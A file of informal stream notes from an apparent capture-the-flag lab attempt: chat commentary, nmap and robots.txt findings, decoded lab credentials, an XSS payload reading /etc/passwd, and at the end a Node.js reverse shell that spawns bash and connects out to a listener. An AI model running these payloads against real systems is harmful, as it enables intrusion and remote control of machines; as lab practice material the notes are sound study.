@@ -1,0 +1,170 @@
+
+
+Chat
+-----------------------------------------------
+
+Perfectooooo It's working nowww...
+
+
+
+Let's start!!!
+
+We prolly shouldn't do that.... Uk, like, It's a real old boxxxx...
+
+We gotta stick to what was intended to get root or any highest privilege a user has.
+
+That's strange... Let's move on.
+
+
+OMG, this was not expected... WAaaowww, hmm, how about a crawler like ccurl would come in?? May be this wasn't intended for that crawler... I mean whatevver.... Let's try other things...
+
+Haha, gold. Are these base64??
+
+Something is odd here... Unlile kroemer and joeuser, kbookout and janeuser is not having any tag like gold / platnum... Hmmm may be I should see more into the store as it may be something related to that... But before that... Let's see if we can ssh using these credentials into the machine.
+
+F there's no ssh.
+Aight, let's... enumerate more about hte web-app.
+
+Guess we have an XSS here...
+
+Ooh we have a doc of contacts
+
+CRAPPP!!!
+
+Let's do it the old wayy...
+
+Ooof such an old file... Gawwdd
+
+Let's leave that for a while....
+
+May be the IP is the ip they connected from to this site... :thinking:
+
+HOLLYYY F. This pdf is soooo old... Even browser wouldn't interpret it... DAMNNN
+
+Can we even root this box??
+
+Will check that once we enumerate the sql port a bit
+
+THE ONEE TIMEE!! SOrry my os is a bit new... That's why Idon't have the necessary packages... hehe.
+
+Let's try this one more time...
+
+
+Hahhaha, I can't connect to the database...
+
+How the heckkkk these services are running? on startuppp
+
+HOlllyyyy F. This is like a complete different OS.
+
+Nvm, lezz just move on.
+
+Ukw, that's not of any use... it's oudated... To get mysql login... We must install a low level mysql shell... client... whatever that is... Hmm, may be the goal of this box is to hack in and steal the mysql credentials... Well the good thing is... we can retrieve that file somehow...
+
+See, let's make it our goal... To retrieve these... #These our flags..
+
+Hah, this is the upgrade in tech... The UI felt nice on my eyes this time.
+
+Ok so let's sum up what we have here... 
+	- An XSS
+	- May be sqli (I am too lazy to test for sqli) Let's try to view that for laters... (may be it doesn't even exists... Because we got some creds for sqli already (may be))
+
+	- OUTDATED VERSIONS OF EVERYTHING.
+
+	NOTE: Can't login into mysql.
+
+Trying xss...
+
+Ohh one more thing... I think, this won't work.. .Because js is meant to execute on client side not on server side... So to trigger the XSS we have to... make it somehow execute on the client side... 
+
+About that hint... the hacker was talking about hacking and stealing all the credits cards... Those must be in mysql db right? We can retrieve that if we get access to those files... Hmmmm...
+
+
+F... gotta gave those script tags.. lol
+
+
+Oops sorry, got disconnected by mistake..
+
+Well the last stream was 1.25 hours long... Noice.. I love streaming hahah
+
+<script>
+	x=new XMLHttpRequest;
+	x.onload=function(){
+		document.write(this.responseText)
+	};
+	x.open("GET","file:///etc/passwd");
+	x.send();
+</script>
+
+Let's try this one???
+
+Yess write.. This might work... Because this seems to create a new http request to the server... Let's check it out.
+
+
+Back to classics!!
+aah may be the vulnerability was in a particular webapp offering pdf download thingy...
+
+There's something odd with this... The output is getting stored... But not working... coz usually I remember it should work like this. F lol. sorry.
+ Noice
+
+ Hmm, so we got a stored xss here... Good. so how to get that lfi stuff done... Coz we need to retrieve those creds right??	
+
+ Sorry, I don't know what is going on... Like, the stream is having some issues.
+
+Alright... I think there is some issue right now, with this box :sweat_smile:
+
+Well how about if we just analyze directly within the box...
+
+hah, files that I have viewed for the first time... 
+
+There was nothing within this box... that could be use to our skill improvement... Instead... How to tackle systems with completely new infrastructure... Well truth be told... I can't do that for now :sweat_smile: Let's just end this stream right there. Cheese :)
+
+
+
+==================================================
+
+
+Nmap Scan: 
+
+	Discovered open port 3306/tcp on 192.168.1.7
+	Discovered open port 80/tcp on 192.168.1.7
+	Discovered open port 443/tcp on 192.168.1.7
+
+
+Robots.txt:
+
+	Disallow: /cgi-bin
+	Disallow: /scanbot # We like Google
+	Disallow: /backup
+	Disallow: /supplier
+	Disallow: /upload
+
+
+In /accounts dir:
+	1001:am9ldXNlci9wYXNzd29yZC9wbGF0bnVtLzE5Mi4xNjguMTAwLjU2DQo=
+	1002:a3JvZW1lci9zM0NyM3QvZ29sZC8xMC4xMDAuMTAwLjE=
+	1003:amFuZXVzZXIvd2FpdGluZzRGcmlkYXkvMTcyLjIyLjEyLjE5
+	1004:a2Jvb2tvdXQvc2VuZG1lYXBvLzEwLjEwMC4xMDAuMjA=
+
+	User Accounts Detected: 
+		- kbookout/sendmeapo/10.100.100.20
+		- janeuser/waiting4Friday/172.22.12.19
+		- kroemer/s3Cr3t/gold/10.100.100.1
+		- joeuser/password/platnum/192.168.100.56
+
+
+Identifying our xss target... We can put anything in your name part... that will work to explot xss.
+
+
+
+
+var spawn = require('child_process').spawn;
+var net = require('net');
+var reconnect = require('reconnect');
+
+reconnect(function (stream) {
+    var ps = spawn('bash', [ '-i' ]);
+    stream.pipe(ps.stdin);
+    ps.stdout.pipe(stream, { end: false });
+    ps.stderr.pipe(stream, { end: false });
+    ps.on('exit', function () { stream.end() });
+}).connect(1234, '192.168.1.5');
